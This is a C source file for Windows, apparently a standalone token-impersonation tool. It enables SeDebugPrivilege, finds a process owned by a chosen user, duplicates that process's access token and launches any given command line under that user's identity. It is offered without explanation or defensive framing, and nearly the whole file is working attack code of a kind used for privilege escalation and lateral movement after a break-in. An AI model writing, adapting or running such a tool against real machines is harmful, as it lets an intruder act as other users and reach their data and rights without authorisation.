#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <sddl.h>

// Function to enable a privilege
BOOL EnablePrivilege(LPCTSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

// Function to convert a username to a SID
BOOL GetUserSid(LPCSTR username, PSID *sid) {
    DWORD sidSize = 0, domainSize = 0;
    SID_NAME_USE sidType;
    LookupAccountNameA(NULL, username, NULL, &sidSize, NULL, &domainSize, &sidType);

    *sid = (PSID)malloc(sidSize);
    char *domain = (char *)malloc(domainSize);

    if (!LookupAccountNameA(NULL, username, *sid, &sidSize, domain, &domainSize, &sidType)) {
        free(*sid);
        free(domain);
        return FALSE;
    }

    free(domain);
    return TRUE;
}

// Function to check if a process is running as a specific user
BOOL IsProcessRunningAsUser(DWORD processId, PSID userSid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (hProcess == NULL) {
        return FALSE;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    DWORD tokenUserLength = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenUserLength);

    PTOKEN_USER tokenUser = (PTOKEN_USER)malloc(tokenUserLength);
    if (tokenUser == NULL) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenUser, tokenUser, tokenUserLength, &tokenUserLength)) {
        free(tokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    BOOL isUser = EqualSid(tokenUser->User.Sid, userSid);
    free(tokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return isUser;
}

LPWSTR ConvertToLPWSTR(const char* charString) {
    size_t length = strlen(charString) + 1;
    wchar_t* wString = (wchar_t*)malloc(length * sizeof(wchar_t));
    if (wString == NULL) {
        return NULL;
    }
    MultiByteToWideChar(CP_UTF8, 0, charString, -1, wString, length);
    return wString;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <username> <command_line>\n", argv[0]);
        return 1;
    }

    char *targetUsername = argv[1];
    LPWSTR commandLine = ConvertToLPWSTR(argv[2]);
    PSID targetSid;

    if (!GetUserSid(targetUsername, &targetSid)) {
        printf("Could not find SID for user %s\n", targetUsername);
        return 1;
    }

    // Enable the SeDebugPrivilege privilege
    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        printf("Failed to enable SeDebugPrivilege\n");
        free(targetSid);
        return 1;
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot error: %u\n", GetLastError());
        free(targetSid);
        return 1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("Process32First error: %u\n", GetLastError());
        CloseHandle(hSnapshot);
        free(targetSid);
        return 1;
    }

    BOOL foundUserProcess = FALSE;
    DWORD targetPID = 0;

    do {
        if (IsProcessRunningAsUser(pe32.th32ProcessID, targetSid)) {
            targetPID = pe32.th32ProcessID;
            foundUserProcess = TRUE;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    free(targetSid);

    if (!foundUserProcess) {
        printf("Could not find a suitable process for user %s\n", targetUsername);
        return 1;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (hProcess == NULL) {
        printf("OpenProcess error: %u\n", GetLastError());
        return 1;
    }

    // Open the token of the target process
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken error: %u\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Duplicate the token
    HANDLE hImpersonationToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hImpersonationToken)) {
        printf("DuplicateTokenEx error: %u\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    printf("Successfully impersonated the user %s\n", targetUsername);

    // Start cmd.exe as the impersonated user
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessWithTokenW(hImpersonationToken, LOGON_NETCREDENTIALS_ONLY, NULL, commandLine, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("CreateProcessWithTokenW error: %u\n", GetLastError());
        CloseHandle(hImpersonationToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Revert to self
    if (!RevertToSelf()) {
        printf("RevertToSelf error: %u\n", GetLastError());
    }

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hImpersonationToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}
